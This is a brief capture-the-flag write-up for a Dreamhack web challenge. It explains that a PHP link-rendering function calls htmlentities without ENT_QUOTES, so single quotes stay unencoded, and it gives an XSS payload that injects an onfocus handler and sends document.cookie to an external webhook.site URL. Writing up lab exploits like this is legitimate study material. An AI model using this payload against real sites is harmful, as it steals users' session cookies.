[link](https://dreamhack.io/wargame/challenges/41)
```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  return $content;
}
?>
```
web application use `htmlentities` tp prevent XSS but not using the `ENT_QUOTES` (the `'` no encode entity).


payload: **[xss](javascript:location=`https://webhook.site/ff5cb011-604b-4a33-8f15-28450e5dcb9d?cookie=`+document.cookie' autofocus onfocus='location=this.href')**

another method: encode_url payload 